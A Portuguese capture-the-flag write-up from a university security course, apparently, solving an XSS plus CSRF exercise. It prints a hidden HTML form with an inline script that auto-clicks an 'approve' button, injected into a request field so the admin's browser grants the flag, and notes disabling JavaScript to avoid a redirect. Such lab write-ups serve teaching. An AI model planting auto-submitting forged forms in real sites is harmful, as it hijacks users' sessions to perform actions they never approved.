# CTF Semana 6 (XSS + CSRF)

Entramos no site (http://ctf-fsi.fe.up.pt:5004/request) e verificamos que podemos submeter um request para obter a flag,este request tem um id associado.

Submetemos um valor arbitrário e somos redirecionados para a página com o request submetido, aqui é possível aceder à pagina do admin, onde podemos investigar o form do give flag. Aqui temos acesso ao seguinte código:

```html

<form method="POST" action="/request/f425c966cc54164008f7d01ece62bdf0565dae09/approve" role="form">
    <div class="submit">
        
        <input type="submit" id="giveflag" value="Give the flag" disabled="">
        
    </div>
</form>

```
O id do request que submetemos e que, por conseguinte, é o mesmo apresentado na página de submissão, está visivel.

```html

<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/f425c966cc54164008f7d01ece62bdf0565dae09/approve" role="form" hidden>   
  <div class="submit">        
       <input type="submit" id="giveflag" value="Give the flag">  
     </div>     
   <script>         document.getElementById('giveflag').click();     </script>
 </form>

 ```

Assim, voltamos à página inicial e inserimos este form com o novo id e um script para clickar no botão give flag, após a submissão verificamos que não temos permissão pois uma mensagem "Forbidden" é apresentada. Para contornar isto, desligamos o javascript para a página (http://ctf-fsi.fe.up.pt:5004/request/f425c966cc54164008f7d01ece62bdf0565dae09), a página da justificação.
Desta forma, após voltamos a submeter o form somos redirecionados para a página da justificação,no entanto, o request ainda não foi avaliado, isto porque como o javascript está desligado a página não faz reload automático sendo necessário fazer reload manualmente e a flag é apresentada.


